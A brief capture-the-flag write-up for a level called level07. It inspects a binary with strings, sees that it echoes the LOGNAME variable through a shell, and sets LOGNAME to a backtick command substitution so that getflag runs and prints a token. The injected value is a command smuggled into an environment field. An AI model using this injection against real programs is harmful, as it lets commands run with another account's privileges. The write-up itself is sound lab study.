$> ls -la
there is an executable level07, we get a level07 when we execute it.

$> strings level07
we can see this: 
"LOGNAME"
"/bin/echo %s"

so it is echo-ing an env variable called LOGNAME.

we can try to put a `getflag` as the LOGNAME value
$> export LOGNAME=\`getflag\`
$> ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
